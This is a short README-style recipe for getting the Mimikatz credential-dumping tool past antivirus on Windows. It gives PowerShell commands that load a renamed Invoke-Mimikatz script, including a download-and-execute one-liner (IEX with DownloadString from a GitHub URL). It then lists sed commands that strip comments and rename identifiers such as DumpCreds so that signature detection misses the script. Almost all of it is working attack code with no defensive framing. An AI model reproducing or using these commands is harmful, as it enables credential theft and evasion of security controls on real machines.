# AV Bypass to run Mimikatz

(mimikatz 2.1.1 (x64) built on Nov 12 2017 15:32:00)



Powershell as Administrator

    Import-Module .\Invoke-Mimidogz.ps1
    Invoke-Mimikatz -Command "privilege::debug"

or via web:

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mttstt/mimi/master/Invoke-Mimidogz.ps1');Invoke-Mimidogz -Command "privilege::debug" 



# Script to create the

    wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
    sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
    sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
    sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
    sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
    sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1
    sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1
    sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
